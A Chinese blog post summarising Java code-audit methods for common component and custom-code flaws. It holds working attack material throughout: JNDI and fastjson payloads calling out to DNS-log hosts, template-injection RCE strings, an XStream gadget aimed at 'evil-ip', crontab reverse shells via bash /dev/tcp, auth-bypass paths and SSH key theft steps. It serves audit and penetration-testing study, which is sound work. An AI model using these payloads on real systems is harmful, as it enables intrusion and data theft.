+++
ShowToc = true
TocOpen = true
title = '代码审计总结'
date = 2024-12-19T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'Java安全'
+++

# 前言

Java安全是一个比较庞大的东西，单论Java代码审计所需要的知识点其实较为简单，Java安全研究会比较深入，其实可以这两者可以较为明显的区分开来，一个为了业务服务，一个为了深入挖掘。单论安全服务以及渗透测试的程度，业务层面的Java代码审计足以。如果是要深入研究的话，愚见认为，不同的岗位决定对知识的掌握深度，当前岗位如果有深入需求再考虑。以下文章内容仅从快速完成代码审计的视角出发，不涉及深入的漏洞研究。

# 常见组件漏洞

## 1、Shiro

shiro的漏洞主要是两个，一个是硬编码，一个是权限绕过：

### 硬编码：

硬编码漏洞大家都知道问题出在rememberMe功能上，对于shiro而言，配置rememberMe的方法大致如下：

```
securityManager.setRememberMeManager(rememberMeManager());//设置rememberMeManager()

关键词：setRememberMeManager

具体实现：
public CookieRememberMeManager rememberMeManager()  
{  
    CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();  
    cookieRememberMeManager.setCookie(rememberMeCookie());  
    cookieRememberMeManager.setCipherKey(Base64.decode("fCq+/xW488hMTCD+cmJ3aQ=="));  
    return cookieRememberMeManager;  
}

搜索密钥关键词：setCipherKey

shiro还可以通过配置文件的方式进行配置，同样可以搜索关键词：
org.apache.shiro.web.mgt.DefaultWebSecurityManager
org.apache.shiro.web.mgt.CookieRememberMeManager
```

案例：

![](/dmsj_img/Pasted%20image%2020241210212625.png)

![](/dmsj_img/Pasted%20image%2020241210212644.png)

![](/dmsj_img/Pasted%20image%2020241210212700.png)

![](/dmsj_img/Pasted%20image%2020241210212952.png)

### 权限绕过：

| CVE            | 描述                 | 影响范围          | payload                    |
| -------------- | ------------------ | ------------- | -------------------------- |
| CVE-2020-1957  | 权限绕过               | Shiro < 1.5.2 | /xxx/..;/admin/            |
| CVE-2020-11989 | CVE-2020-1957补丁绕过  | Shiro < 1.5.3 | /;/admin/page              |
| CVE-2020-13933 | CVE-2020-11989补丁绕过 | Shiro < 1.6.0 | /admin/%3bpage             |
| CVE-2020-17523 | 权限绕过               | Shiro < 1.7.1 | /admin/%20  <br>/admin/%2e |
shiro配置路径匿名访问的方法大概如下：

1、集中配置

![](/dmsj_img/Pasted%20image%2020241210213452.png)

```
通过定义Shiro的ShiroFilterFactoryBean，可以设置具体的URL路径与对应的过滤器链：
关键词shiroFilterFactoryBean
```

2、注解

```
@RequiresRoles、@RequiresPermissions

例如：
@RequiresRoles("admin")
public void someMethod() {
    // 方法内容
}
```

案例：

![](/dmsj_img/Pasted%20image%2020241210213741.png)
![](/dmsj_img/Pasted%20image%2020241210215227.png)
![](/dmsj_img/Pasted%20image%2020241210215157.png)
## 2、fastjson

安全版本>1.2.83

fastjson的触发点较为单一，关键词：JSON.parseObject、JSON.parse，只要相关参数用户可控即可。

一些知识点：jdni注入，rmi要求JDK8版本低于8u121，ldap要求低于8u191，当然存在一些高版本jdk的利用姿势，不过代码审计的情况下可以尽量便利一些。

由于fastjson采用的黑名单修复，很多类不一定能加载，以下dnslong仅限于证明参数用户可控，具体能否漏洞利用成功受限于具体的fastjson版本以及jdk版本。


```
{"@type":"java.net.URL","val":"http://8157cfb94b.ipv6.1433.eu.org"}
{{"@type":"java.net.URL","val":"http://8157cfb94b.ipv6.1433.eu.org"}:"x"}
{"@type":"java.net.InetAddress","val":"dnslog"}
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
{{"@type":"java.net.URL","val":"dnslog"}:"aaa"}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
Set[{"@type":"java.net.URL","val":"http://dnslog"}]
Set[{"@type":"java.net.URL","val":"http://dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
{{"@type":"java.net.URL","val":"http://dnslog"}:0
```

案例：

![](/dmsj_img/Pasted%20image%2020241210223032.png)

![](/dmsj_img/Pasted%20image%2020241210223001.png)
这个参数非常清晰：
![](/dmsj_img/Pasted%20image%2020241210223409.png)

![](/dmsj_img/Pasted%20image%2020241210224920.png)

![](/dmsj_img/Pasted%20image%2020241210224936.png)


![](/dmsj_img/Pasted%20image%2020241210225915.png)

## 3、log4j2

Apache Log4j 2.x <= 2.15.0-rc1

log4j2的触发点审计需要知道一些前提知识点：

```
log4j的日志记录具有等级划分：
ALL < TRACE < DEBUG < INFO < WARN < ERROR < FATAL < OFF
默认情况下只会记录大于WARN等级的日志，也就是说默认情况下，我们的审计关键词为logger.error和logger.fatal

但是也有修改等级的方法，审计的时候需要注意：

1、通过编程方式设置
import org.apache.logging.log4j.Level
logger.setLevel(Level.DEBUG); // 设置日志等级为 DEBUG

2、XML 配置文件
    <Loggers>
        <Root level="debug">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>

3、 JSON 配置文件
 "Loggers": {
      "Root": {
        "level": "debug",
        
4、 YAML 配置文件
  Loggers:
    Root:
      level: debug

根据配置文件，可以确定审计的关键词为：logger.TRACE < DEBUG < INFO < WARN < ERROR < FATAL
```

payload：

```
${jndi:ldap://${env:OS}.61169aeb6f.ipv6.1433.eu.org}
```

案例：

所有的日志都将生效：

![](/dmsj_img/Pasted%20image%2020241211153441.png)

寻找可控点：

![](/dmsj_img/Pasted%20image%2020241211153559.png)

这里是一个获取上传文件名的地方，参数可控：

![](/dmsj_img/Pasted%20image%2020241211153808.png)

![](/dmsj_img/Pasted%20image%2020241211154252.png)
![](/dmsj_img/Pasted%20image%2020241211154345.png)

![](/dmsj_img/Pasted%20image%2020241211154747.png)

![](/dmsj_img/Pasted%20image%2020241211154801.png)
 ## 4、SpEL

SpEL表达式注入，这个漏洞其实在网站开发者中的自编码中并不常见，更多是在spring家族的一些组件里面，这个简单来说就是将用户的输入带入SpEL表达式中执行了：

单独代码审计关键词：

```
//关键类  
org.springframework.expression.Expression  
org.springframework.expression.ExpressionParser  
org.springframework.expression.spel.standard.SpelExpressionParser  
  
//调用特征  
ExpressionParser parser = new SpelExpressionParser();  
Expression expression = parser.parseExpression(str);  
expression.getValue()  
expression.setValue()

黑盒一般使用一些数字${3333-1}
```

一些著名的SpEL注入组件：

```
CVE-2016-4977 黑盒有概率遇到
Spring Security OAuth 2.3到2.3.2
Spring Security OAuth 2.2到2.2.1
Spring Security OAuth 2.1到2.1.1
Spring Security OAuth 2.0到2.0.14

CVE-2017-4971
Pivotal Spring_Web_Flow 2.4.0到2.4.4

CVE-2017-8046
Pivotal_Software Spring_Data_Rest < 2.6.9
VMware Spring_Boot 2.0.0
VMware Spring_Boot < 1.5.9
Pivotal_Software Spring_Data_Rest 3.0.0

CVE-2018-1270
Spring Framework 5.0 to 5.0.4.
Spring Framework 4.3 to 4.3.14

CVE-2018-1273
Spring Data Commons 1.13至1.13.10
Spring Data REST 2.6至2.6.10
Spring Data Commons 2.0至2.0.5
Spring Data REST 3.0至3.0.5

CVE-2022-22947 黑盒有大概率遇到
Spring Cloud Gateway 3.1.0至3.1.1和3.0.0至3.0.6


CVE-2022-22963 黑盒有大概率遇到
org.springframework.cloud:spring-cloud-function-context
（影响版本：3.0.0.RELEASE~3.2.2）

CVE-2022-22965 这个不是SpEL表达式注入，但是影响范围比较大，作为审计来说有必要进行查看，黑盒有概率遇到
Spring Framework 5.3.X < 5.3.18 
Spring Framework 5.2.X < 5.2.20
及其衍生产品
JDK ≥ 9
```

上诉漏洞部分在黑盒中并不好使，容易被发现的以进行了备注，利用详情可查看另外一个文章，不容易被黑盒发现的作为审计来说也应该注意规避风险。

## 5、模板注入

JAVA中比较严重的SSTI模板注入主要发生在三个组件上：Freemarker、Velocity、Thymeleaf，因为它们允许直接调用底层 Java 方法：

![](/dmsj_img/Pasted%20image%2020241220153128.png)

### Freemarker：

```
Freemarker的漏洞在于用户可以修改模板，修改模板的方法目前有三个：一是通过stringLoader.putTemplate方法来把模板加载到内存中，二个是通过实例化Template类，三是通过其他方法直接修改对应的模板文件，在实战中多见于参数直接传递，或者直接修改模板文件。

审计正则表达式：
html可换成ftl
return\(.*?\.html
return\s*".*?\.html"
render\(.*?\.html

当一个Controller的方法没有返回值（即返回类型为`void`），并且使用了`@GetMapping`或`@PostMapping`等注解来处理HTTP请求时，Spring MVC会默认将请求的URL作为视图名称，并使用配置的模板引擎（如Thymeleaf）去渲染对应的模板。
审计正则表达式：
@GetMapping\(.*?\)\s*public\s+void/gm

payload:

new函数：
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}

<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")

api函数：
#assign classLoader=object?api.class.protectionDomain.classLoader> 
<#assign clazz=classLoader.loadClass("ClassExposingGSON")> 
<#assign field=clazz?api.getField("GSON")> 
<#assign gson=field?api.get(null)> 
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
${ex("Calc"")}

其中api的方法在2.3.22版本之后默认无法使用，new方法在2.3.30版本后也被做了一些限制，无法直接执行命令，但是仍然需要注意，所以建议至少版本在2.3.30版本后，同时无危险使用方法。
```


案例参考：
https://github.com/pawelkaliniakit/springboot-freemarker-ssti/tree/master
https://github.com/nth347/Java-SSTI-demo

![](/dmsj_img/Pasted%20image%2020241222001709.png)

![](/dmsj_img/Pasted%20image%2020241222001831.png)

### Thymeleaf

```
比较常规的漏洞版本是：Thymeleaf 3.0.0 至 3.0.11，但是后续的漏洞版本修复存在一些绕过问题，建议至少大于3.0.15。

和上一个模板注入的情况类似，我认为最常见的情况还是return或者render返回对应的前端文件。

审计正则表达式：
html可换成ftl
return\(.*?\.html
return\s*".*?\.html"
render\(.*?\.html

当一个Controller的方法没有返回值（即返回类型为`void`），并且使用了`@GetMapping`或`@PostMapping`等注解来处理HTTP请求时，Spring MVC会默认将请求的URL作为视图名称，并使用配置的模板引擎（如Thymeleaf）去渲染对应的模板。
审计正则表达式：
@GetMapping\(.*?\)\s*public\s+void/gm

payload:

__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27calc.exe%27).getInputStream()).next()%7d__::.x
```

### Velocity

```
安全版本：Velocity大于2.2

重点关注：
org.apache.velocity.app.Velocity 的 evaluate 和 mergeTemplate 方法
org.apache.velocity.app.VelocityEngine 的 evaluate 和 mergeTemplate 方法
org.apache.velocity.runtime.RuntimeServices 的 evaluate 和 parse 方法
org.apache.velocity.runtime.RuntimeSingleton 的 parse 方法
org.apache.velocity.runtime.resource.util.StringResourceRepository 的 putStringResource 方法

payload:
#set ($exec = "kxlzx")$exec.class.forName("java.lang.Runtime").getRuntime().exec("calc")

%23set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
```

![](/dmsj_img/Pasted%20image%2020241224151127.png)

![](/dmsj_img/Pasted%20image%2020241224151144.png)



## 6、其他

### XStream

```
<= 1.4.16

这个组件是用来解析xml文件的，可以理解为将xml文件反序列化为对象，和fastjson很像，在反序列化时会调用对象的readObject方法，找到合适的链子即可RCE，目前使用的较多的是JDNI的那条，审计关键词：
XStream.fromXML()
```

poc，修改evil-ip：

```
java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "whoami"  //无回显哦，直接打，修改payload直接看看监听也可


<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>evil-ip</string>
                                                <int>1099</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>evil-ip</host>
                                        <port>1099</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```
### Dubbo

```
Dubbo CVE-2019-17564

该漏洞最后触发点在readObject()

2.7.0 <= Apache Dubbo <= 2.7.4
2.6.0 <= Apache Dubbo <= 2.6.7
Apache Dubbo = 2.5.x

<properties>
    <dubbo.version>2.7.5</dubbo.version>
</properties>

<dependencies>
    <dependency>
      <groupId>org.apache.dubbo</groupId>
        <artifactId>dubbo</artifactId>
      <version>${dubbo.version}</version>
    </dependency>
    <dependency>
        <groupId>org.apache.dubbo</groupId>
      <artifactId>dubbo-dependencies-zookeeper</artifactId>
        <version>${dubbo.version}</version>
      <type>pom</type>
    </dependency>
</dependencies>
```

### druid

```
这个组件在黑盒中十分常见，存在未授权的情况大概如下：
druid的配置文件一般是Spring Boot 的 application.yml 或 application.properties
stat-view-servlet配置关键词：
   enabled：是否启用 Druid 监控页面。
   login-username：监控页面登录账号。
   login-password：监控页面登录密码。
   reset-enable：是否允许重置统计数据。

一般来说只要是enabled: true就是有相关页面的，但是是否存在未授权还要看整个系统的访问控制以及是否配置了一些访问限制
```

案例：

这里是配置了相关路径的：

![](/dmsj_img/Pasted%20image%2020241212221854.png)

但是直接访问不行，会被shiro的权限控制给拦截，在shiro中添加匿名访问路径：

![](/dmsj_img/Pasted%20image%2020241212222515.png)
就会有匿名访问了：
![](/dmsj_img/Pasted%20image%2020241212222525.png)

### Spring boot Actuator

Spring Boot Actuator 是 Spring Boot 提供的一个监控和管理工具，它提供了一系列的Endpoints，允许开发者访问应用程序的运行时信息，如健康检查、环境属性、度量指标等，这是个未授权访问，在黑盒测试中也是常客，多次headump敏感信息泄露拿下站点：

```
相关组件：
<groupId>org.springframework.boot</groupId>  
<artifactId>spring-boot-starter-actuator</artifactId>  


配置文件一般是Spring Boot 的 application.yml 或 application.properties

以下是一些常用的配置项：

management.endpoints.web.exposure.include：指定哪些端点应该被暴露出来。默认情况下，只有 /health 和 /info 这两个端点可用。如果想启用所有端点，可以设置为 *

management.endpoints.web.exposure.exclude：指定哪些端点不应该被暴露出来

management.endpoints.web.base-path：指定所有端点的基础路径，默认为 /actuator

management.endpoints.web.path-mapping：指定端点的路径映射

management.endpoints.web.cors.allowed-origins：指定哪些源站点可以访问端点

management.endpoint.health.show-details：更改健康端点的显示详细信息，可以设置为 always、when_authorized 或 never
```

案例：

![](/dmsj_img/Pasted%20image%2020241212223958.png)

![](/dmsj_img/Pasted%20image%2020241212224116.png)

### Swagger

这个也是黑盒常客，和druid一样的，开启即会有页面，但是是否可访问还要看权限控制：

```
组件：
<groupId>io.springfox</groupId>  
<artifactId>springfox-swagger2</artifactId>

<groupId>io.springfox</groupId>
<artifactId>springfox-swagger-ui</artifactId>

配置一般是一个单独的java类：
关键词：
@EnableSwagger2
import springfox.documentation.swagger2
```

案例：

![](/dmsj_img/Pasted%20image%2020241212225907.png)

添加匿名权限：

![](/dmsj_img/Pasted%20image%2020241212230156.png)

![](/dmsj_img/Pasted%20image%2020241212230209.png)

### Apache ActiveMQ

漏扫常客：

| 漏洞编号           | 漏洞类型   | 版本                                                             |
| -------------- | ------ | -------------------------------------------------------------- |
| CVE-2024-32114 | 未授权    | 6.0.0 <= Apache ActiveMQ < 6.1.2                               |
| CVE-2023-46604 | RCE    | Apache AchtiveMQ <= 5.18.2                                     |
| CVE-2022-41678 | RCE    | Apache ActiveMQ < 5.16.6  <br>5.17.0< Apache ActiveMQ < 5.17.4 |
| CVE-2017-15709 | 信息泄漏   | Apache ActiveMQ <= 5.15.2                                      |
| CVE-2016-3088  | 任意文件写入 | Apache ActiveMQ < 5.14.0                                       |
| CVE-2015-5254  | 反序列化   | Apache ActiveMQ < 5.13.0                                       |


```
依赖：

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-activemq</artifactId>
</dependency>
<dependency>
    <groupId>org.apache.activemq</groupId>
    <artifactId>activemq-pool</artifactId>
    <version>5.12.1</version> 
</dependency>


在application.properties或application.yml配置：

spring.activemq.broker-url=tcp://localhost:61616
spring.activemq.user=admin
spring.activemq.password=admin
```

### Zookeeper

ZooKeeper是一个开源的分布式协调服务，它主要用于分布式系统的协调、配置管理、命名、提供分布式同步以及组服务等

安全版本：Apache ZooKeeper >= 3.9.3

```
配置：
<dependency>
    <groupId>org.apache.zookeeper</groupId>
    <artifactId>zookeeper</artifactId>
    <version>3.7.0</version> 
</dependency>

在application.properties或application.yml配置：
zookeeper.connect-string=localhost:2181
connect-string: localhost:2181
```

### 不安全的反射

这个漏洞在实战中并不多见，但是有少量的案例，大多和RCE有关：

```
关键类：

java.lang.reflect.Method.invoke()
java.lang.ClassLoader.loadClass()
java.net.URLClassLoader.newInstance()
org.codehaus.groovy.runtime.InvokerHelper.invokeMethod()

这个漏洞具体得看相关代码和触发条件，大多还位于能直接调用类的功能点，寻找可用类是个比较麻烦的地方，不过从甲方视角来看，仍然是个需要修复的地方，建议做好限制。
```

# 自编码漏洞

## 1、SQL注入

Sql注入大部分静态代码审计都可以做到扫出，重点在于参数是否确实可控，以及相关的插入位置是否好利用，例如之前遇到过一些子查询，确实会将用户语句带入其中，但是用户十分难以控制，这种在甲方视角勉强算一个需要处理的点，但是在红队视角实在是难以算作可以利用。

mybatis：

```
1. Like 模糊查询： Select * from student where name like '%${name}%'
    
2. IN 查询： Select * from news where id in (${id})
    
3. order by、group by 查询： select * from studentwhere id order by ${id}
```

JDBC：

```
String sql = "select * from users where id = '"+id+"' ";
```

## 2、XSS

在java中XSS漏洞不是一个，个别点位的问题，它应该是一个整体项目的问题，XSS漏洞的逻辑是从前端获取参数，然后重新渲染到前端的过程，这中间可以从后端拦截处理，前端技术也可避免XSS，但是很多甲方视角可能不太认可前端处理的情况。

从我的观点来看，如果一个系统没有全局过滤Filter来处理XSS，那么有很大可能是存在XSS的，关键词：XSS、XSSFilter，或者全局查找filter。

但是参数的追踪是个比较麻烦的事情，具体是否返回给前端参数了，需要具体情况具体分析，同样的，如果给了前端，前端是否正确解析也是一个问题，比如使用了VUE、React、Angular、以及ESAPI转义后的字符。

前端参数的获取方式：

```
目前主流的获取前端参数的方式有三种：
1、Servlet

request.getParameter("xx")

2、Struts2框架

public class MyAction extends ActionSupport {
    private String username;
    private String password;

3、SpringMVC
@RequestParam
@param 
```

最后，无论是反射型的XSS还存储型的XSS，其实我认为最好还是借助工具和黑盒测验比较好，纯白盒不是很好操作，虽然网上很多人说fortify对于XSS审计还行，但是实际上还是很难完全审好，如果硬要手动审计，我建议从前端触发点反推到Controller：

关键词：

```
<%=
${
<c:out  
<c:if  
<c:forEach  
ModelAndView  
ModelMap  
Model  
request.getParameter  
request.setAttribute
resopnse.getWriter()
```

案例：

结合黑盒测试，把用户名修改为xss payload然后刷新发现弹窗：

![](/dmsj_img/Pasted%20image%2020241214161928.png)

然后追踪到前端，此处是一个获取展示用户名的功能，可以看到关键词：${requestScope.admin.admin_name}

![](/dmsj_img/Pasted%20image%2020241214163410.png)

向上查找：

![](/dmsj_img/Pasted%20image%2020241214163428.png)

继续向上：

![](/dmsj_img/Pasted%20image%2020241214163500.png)

可以看到参数返回了：

![](/dmsj_img/Pasted%20image%2020241214163806.png)

进入数据库看看，至于怎么写入的，会跟踪controller到dao层的就能看懂：

![](/dmsj_img/Pasted%20image%2020241214163902.png)

## 3、文件上传

文件上传在较近年的springboot项目中可能遇到JSP文件不解析的情况，因为springboot内置的tomcat服务器默认不支持tomcat-embed-jasper，但是不代表这个漏洞不重要，就算无法直接写webshell，但是如果java程序是以高权限启动的，配合目录穿越，可能导致写入密钥、计划任务、passwd、如果能触发jar包的话，方法就更多了。

关键词：

```
CommonsMultipartFile
new FileOutputStream
new File(realPath);
ServletFileUpload
lastIndexOf(".")
indexOf(".")
MultipartFile
.write
.println
.writeUTF
.writeBytes
.writeObject

tomcat-embed-jasper组件：
<groupId>org.apache.tomcat.embed</groupId>  
<artifactId>tomcat-embed-jasper</artifactId>
```

案例：

![](/dmsj_img/Pasted%20image%2020241216182717.png)

基本没有什么过滤：

![](/dmsj_img/Pasted%20image%2020241216182836.png)

![](/dmsj_img/Pasted%20image%2020241216192227.png)

```
centos:
echo '*/1 * * * * bash -i >& /dev/tcp/192.168.25.128/11111 0>&1' > /var/spool/cron/root

echo '*/1 * * * * root bash -i >& /dev/tcp/192.168.25.128/33333 0>&1' >> /etc/crontab

ubuntu:
echo '*/1 * * * * bash -c "bash -i >& /dev/tcp/192.168.25.128/11111 0>&1"' > /var/spool/cron/crontabs/root

echo '*/1 * * * * root bash -c "bash -i >& /dev/tcp/192.168.25.128/33333 0>&1"' >> /etc/crontab
```


![](/dmsj_img/Pasted%20image%2020241216192201.png)

![](/dmsj_img/Pasted%20image%2020241216192332.png)

其实这里还是有些问题的，ubuntu对于计划任务的文件权限有些要求，测试600可以正常反弹，centos应该就可以直接使用这个方式了：

![](/dmsj_img/Pasted%20image%2020241216193051.png)

## 4、任意文件下载

这个漏洞在打多数的系统中都是用来获取敏感信息的，如果想要以此获得更多东西，可以尝试读取配置文件、/home/username/.ssh/id_rsa(id_ecdsa)、或者jar包：

```
【Step1】定位启动的时候jar包的pid

    通过任意文件读取/proc/sched_debug，获取服务器中的进程信息。通过关键字java定位SpringBoot对应的进程，获取进程号pid。实战取决于目标系统的情况，实在不行可以爆破。

【Step2】获取jar包绝对路径

    通过/proc/[PID]/cmdline和/proc/[PID]/environ,其中的PWD存在绝对路径，一般情况下通过这种方式可以拿到SpringBoot对应的jar包的绝对路径。其中cmdline可以获取进程对应的包名，environ可以获取对应的绝对路径，组合之后可以得到jar包对应绝对路径。
```

关键词：

```
fileName
filePath
getFile
getWriter
InputStream
File 
OutputStreaam 
BufferedInputStream
FileInputStream
```

案例：

![](/dmsj_img/Pasted%20image%2020241217153117.png)

这里有个前置路径，全局设置的download下载目录，不过不重要，../可以目录穿越：

![](/dmsj_img/Pasted%20image%2020241217153228.png)

任意文件读取：

![](/dmsj_img/Pasted%20image%2020241217155044.png)

获取进程信息：

![](/dmsj_img/Pasted%20image%2020241217155954.png)

名字：

![](/dmsj_img/Pasted%20image%2020241217160024.png)

下载jar包，war包其实同理：

![](/dmsj_img/Pasted%20image%2020241217160614.png)

## 5、SSRF&CSRF

SSRF其实在java中的危害比较有限了，因为JDK7高版本，以及JDK8以上都不支持一些高危协议比如Gopher和DICT了，只需要在代码中做好限制范围和协议即可。

```
HttpURLConnection.getInputStream
URLConnection.getInputStream
Request.Get.execute
Request.Post.execute
URL.openStream
ImageIO.read
OkHttpClient.newCall.execute
HttpClients.execute
HttpClient.execute
BasicHttpEntityEnclosingRequest()
DefaultBHttpClientConnection()
BasicHttpRequest()
```


CSRF的话主要看相关的一些功能点是否有做好限制，比如Token或者Referer或者验证码等其他手段，本身的危害不大，比如一些功能：更改个人信息、添加/修改资料、关注/取关用户、发布主题或信息、与交易相关的操作，审计的话，配合黑盒全局搜索Token、Referer、CSRF等关键词。

## 6、URL重定向

这个漏洞主要用来钓鱼，红队实战用到不多，但是绝对不是没有用处，常见于登录、注册、下单、付款、查看个人信息。

关键词：

```
redirect
url
redirectUrl
callback
return_url
toUrl
ReturnUrl
fromUrl
redUrl
request
redirect_to
redirect_url
jump
jump_to
target
to
goto
link
linkto
domain
oauth_callback
```

```
http://localhost/vulnapi/redirect/vul?url=https://www.baidu.com
```

![](/dmsj_img/Pasted%20image%2020241218163643.png)


## 7、逻辑漏洞

从黑盒测试的经验来看，逻辑漏洞在java中的产出概率比其他漏洞其实高不少，因为种种框架的出现，帮助开发者规避了很多的top10漏洞，但是业务逻辑很大程度取决于开发者，而开发者不是每个都具有安全意识的。

其实我认为从发掘安全问题的角度出发，逻辑漏洞应该是黑盒更方便进行检测，常见的一些逻辑漏洞：

```
数据可遍历
越权
API未授权
用户名、密码爆破【登录认证问题】
支付漏洞
验证码问题【验证码不失效、一码多用、可被识别、可被猜测、可被绕过】
密码重置
```

### 权限问题

上面列出的漏洞中其中一半可以认为是权限问题，权限设计的经典五张表，可以在持久层查看代码是否有考虑到：

```
用户表（User Table）：存储系统中所有合法用户的详细信息，如用户ID、用户名、密码等。
角色表（Role Table）：存储系统中的角色信息，包括角色ID、角色名称以及角色描述等。
权限表（Permission Table）：也称为资源表，存储系统中所有需要控制访问权限的资源或权限信息，如权限ID、权限名称、权限描述等。
用户-角色关联表（User-Role Association Table）：描述用户和角色之间的关系，通常包含用户ID和角色ID。
角色-权限关联表（Role-Permission Association Table）：描述角色和权限之间的关系，通常包含角色ID和权限ID。
```

java常见的权限验证方法，shiro、Spring Security或者手动编写的filter，代码审计可以快速确定，然后是手动filter存在被绕过的可能性，常见的绕过payload为:

```
../
;
/admin/main.do/
//system/UserInfoSearch.do
```

### 支付问题

找到对应的功能点，详细捋清逻辑：

```
1、支付、取款、转账任意金额的修改，未对正负数、原金额足额比较；
2、来自前端的金额直接执行支付操作，未对前端折扣金额等于后端的金额比对；
3、如果未对同一客户端IP、同一用户、同一时间段内重复下单的频率进行先限制和提醒，造成无限刷单；
```

### 密码问题

常见功能如找回密码、重置密码：

```
1、未同时校验原密码和验证码以及新密码
2、水平、垂直越权修改密码
3、短信验证码显示在获取验证码请求的回显中
4、用户名、手机号码、短信验证码三者没有进行匹配性验证：只验证了手机号码、短信验证码是否匹配，但最终重置密码是根据用户名来重置的，攻击者可以绕过短信验证码限制来重置用户密码
5、弱随机性或可预测的令牌生成
```

未完待续......